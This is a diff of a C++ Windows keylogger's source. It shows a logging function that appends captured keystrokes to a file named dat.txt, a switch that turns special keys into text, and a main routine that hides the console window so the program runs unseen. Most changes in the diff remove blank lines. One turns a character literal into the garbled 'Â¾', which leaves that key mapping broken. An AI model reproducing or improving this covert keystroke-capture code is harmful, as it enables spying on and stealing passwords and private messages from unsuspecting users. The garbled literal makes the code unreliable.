@@ -5,13 +5,7 @@
 #include <stdio.h>
 #include <iostream>
 #include <fstream>
-
-
-
 using namespace std;
-
-
-
 void LOG(string input) {
 	fstream LogFile;
 	LogFile.open("dat.txt", fstream::app);
@@ -20,8 +14,6 @@ void LOG(string input) {
 		LogFile.close();
 	}
 }
-
-
 bool SpecialKeys(int S_Key) {
 	switch (S_Key) {
 	case VK_SPACE:
@@ -32,7 +24,7 @@ bool SpecialKeys(int S_Key) {
 		cout << "\n";
 		LOG("\n");
 		return true;
-	case '¾':
+	case 'Â¾':
 		cout << ".";
 		LOG(".");
 		return true;
@@ -84,9 +76,6 @@ bool SpecialKeys(int S_Key) {
 		return false;
 	}
 }
-
-
-
 int main()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
